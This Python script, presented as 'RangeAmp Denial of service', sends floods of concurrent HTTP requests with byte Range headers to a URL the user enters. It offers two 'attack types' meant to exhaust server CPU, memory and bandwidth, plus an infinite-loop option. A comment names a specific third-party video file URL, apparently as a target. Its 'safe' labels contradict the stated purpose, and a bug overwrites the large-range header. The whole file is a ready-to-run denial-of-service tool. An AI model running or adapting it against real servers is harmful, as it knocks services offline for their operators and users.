import asyncio
import os
import signal
import aiohttp
import random
import time
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TimeElapsedColumn, TextColumn

shutdown: bool = False
console = Console()
NUM_THREADS = os.cpu_count() * 2
MAX_RANGE_SIZE = 10000  # Limit the range size to avoid amplification
#https://cdn.nowlms.com/2489/mobile/03/09.mp4

async def generate_safe_range_header() -> str:
    """Generate a safe range header."""
    start = random.randint(0, 1000000)
    end = start + random.randint(1, min(MAX_RANGE_SIZE, 10000))
    return f"bytes={start}-{end}"

# Small Byte Range (SBR) headers configuration
range_sbr = {
    "Connection": "keep-alive",
    "User-Agent": "RangeAmpSBR"
}

# Large Byte Range (LBR) headers configuration
range_lbr = {
    "Range": "bytes=0-524287, 524288-1048575, 1048576-2097151, 2097152-4194303",
    "Connection": "keep-alive", 
    "User-Agent": "RangeAmpLBR"
}

def signal_handler(sig, frame):
    """Signal handler for graceful shutdown."""
    global shutdown
    console.print("[blue][!][/blue] [red]Gracefully shutting down...[/red]")
    shutdown = True

signal.signal(signal.SIGINT, signal_handler)

async def send_request_async(url, session, headers):
    """Send an asynchronous request."""
    global shutdown
    if shutdown:
        return
    try:
        headers["Range"] = await generate_safe_range_header()   # Dynamically generate range header
        async with session.get(url, headers=headers):
            pass
    except Exception as e:
        console.print(f"[red]Error occurred: {e}")

async def run_concurrent_requests_async(url, n, num_threads=8, headers=range_sbr, sbr_mode=False):
    """Run concurrent requests asynchronously"""
    global shutdown
    tasks = []
    async with aiohttp.ClientSession(headers={"Connection": "keep-alive"}) as session:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            task_progress = progress.add_task("[cyan]Sending requests...", total=n)
            for i in range(n):
                if shutdown:
                    console.print("[blue][!][/blue] [green]Gracefully shutting down...[/green]")
                    break
                task = asyncio.create_task(send_request_async(url, session, headers if not sbr_mode else range_sbr))
                tasks.append(task)
                if len(tasks) >= num_threads:
                    await asyncio.gather(*tasks)
                    tasks = []
                progress.update(task_progress, advance=1)
        
        if tasks:
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    console.clear()
    console.print(Panel("[green]RangeAmp[/green] - simple Range Amplification tool\n[purple]Developed by[/purple] Seoyeon Bae (https://github.com/bsy0317)",
                    title="[cyan]RangeAmp Denial of service[/cyan]", border_style="green"))
    console.print(Panel("[yellow]SBR (Small Byte Range)[/yellow] - Sends multiple small byte ranges, forcing the server to repeatedly process minimal data, increasing CPU and memory usage.\n"
                        "[yellow]LBR (Large Byte Range)[/yellow] - Requests large byte ranges to stress bandwidth and data processing capabilities.",
                        title="[cyan]Attack Types[/cyan]", border_style="yellow"))
    attack_type = console.input("Select attack type [green](sbr/lbr):[/green] ")
    if attack_type == "sbr":
        headers = range_sbr
        sbr_mode = True
    elif attack_type == "lbr":
        headers = range_lbr
        sbr_mode = False
    else:
        console.print("[red]Invalid attack type selected.")
        exit(1)

    url = console.input("URL: ")

    n = int(console.input("Loop count [green](-1 for infinite):[/green] "))
    if n == -1:
        n = 2147483647
    start_time = time.time()
    try:
        asyncio.run(run_concurrent_requests_async(url, n, headers=headers, num_threads=NUM_THREADS, sbr_mode=sbr_mode))
    except KeyboardInterrupt:
        console.print("[blue][!][/blue] [red]Asynchronous request execution halted[/red]")
    console.print(f"[green][*] Asynchronous requests took {time.time() - start_time:.2f} seconds[/green]")
